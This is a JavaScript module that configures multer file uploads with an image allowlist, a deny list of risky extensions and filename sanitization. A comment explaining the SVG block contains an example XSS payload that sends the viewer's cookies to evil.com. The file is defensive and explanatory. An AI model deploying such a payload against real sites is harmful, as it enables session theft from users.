import multer from 'multer';
import path from 'path';
import fs from 'fs';

// Make sure 'uploads/' exists
const uploadPath = 'uploads/';
if (!fs.existsSync(uploadPath)) {
  fs.mkdirSync(uploadPath, { recursive: true });
}

/**
 * SECURITY: Allowed file types
 * 
 * ⚠️ CRITICAL: SVG FILES ARE BLOCKED
 * 
 * Why SVG is dangerous:
 * 1. SVG files can contain <script> tags with JavaScript
 * 2. When viewed in browser, the JS executes in the user's session
 * 3. This enables XSS attacks: attacker uploads malicious.svg, victim views it, attacker steals session
 * 
 * Example malicious SVG:
 * <svg xmlns="http://www.w3.org/2000/svg">
 *   <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
 * </svg>
 * 
 * ONLY SAFE IMAGE FORMATS ALLOWED:
 * - JPEG/JPG: Bitmap, no script support
 * - PNG: Bitmap, no script support  
 * - WebP: Modern format, no script support
 * - GIF: Removed - can have animation issues and legacy exploits
 */
const ALLOWED_MIME_TYPES = [
  'image/jpeg',
  'image/jpg',
  'image/png',
  'image/webp'
  // BLOCKED: 'image/svg+xml' - XSS vulnerability
  // BLOCKED: 'image/gif' - animation/legacy concerns
];

const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.webp'];
// BLOCKED: '.svg' - Can contain malicious JavaScript
// BLOCKED: '.gif' - Animation and legacy exploit concerns

/**
 * SECURITY: Dangerous file patterns to reject
 */
const DANGEROUS_PATTERNS = [
  /\.svg$/i,        // SVG files
  /\.html?$/i,      // HTML files
  /\.php$/i,        // PHP files
  /\.js$/i,         // JavaScript files
  /\.exe$/i,        // Executables
  /\.bat$/i,        // Batch files
  /\.sh$/i,         // Shell scripts
];

// ========== STORAGE CONFIGURATION ==========
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadPath);
  },
  filename: function (req, file, cb) {
    // Sanitize filename - remove special characters and path traversal attempts
    const sanitizedName = file.originalname
      .replace(/[^a-zA-Z0-9._-]/g, '_')
      .replace(/\.\./g, '_'); // Prevent path traversal
    const uniqueName = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${sanitizedName}`;
    cb(null, uniqueName);
  }
});

// ========== SECURITY: Strict File Filter ==========
const fileFilter = (req, file, cb) => {
  const ext = path.extname(file.originalname).toLowerCase();

  // Check for dangerous file patterns FIRST
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(file.originalname)) {
      return cb(new Error(`File type not allowed: ${ext}. This file type poses a security risk.`), false);
    }
  }

  // Check MIME type (can be spoofed, but adds a layer)
  if (!ALLOWED_MIME_TYPES.includes(file.mimetype)) {
    return cb(new Error(`Invalid file type: ${file.mimetype}. Only JPEG, PNG, and WebP images are allowed.`), false);
  }

  // Check file extension (primary check)
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    return cb(new Error(`Invalid file extension: ${ext}. Allowed extensions: ${ALLOWED_EXTENSIONS.join(', ')}`), false);
  }

  // Additional check: Reject if mimetype doesn't match extension
  const mimeExtensionMap = {
    'image/jpeg': ['.jpg', '.jpeg'],
    'image/jpg': ['.jpg', '.jpeg'],
    'image/png': ['.png'],
    'image/webp': ['.webp']
  };

  const expectedExtensions = mimeExtensionMap[file.mimetype];
  if (expectedExtensions && !expectedExtensions.includes(ext)) {
    return cb(new Error(`File extension (${ext}) does not match content type (${file.mimetype}). Possible file type spoofing.`), false);
  }

  // All checks passed
  cb(null, true);
};

// ========== MULTER CONFIG WITH STRICT LIMITS ==========
const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB max file size
    files: 10, // Max 10 files per request
    fieldNameSize: 100, // Max field name length
    fieldSize: 1024 * 1024 // 1MB max field value size
  }
});

export default upload;
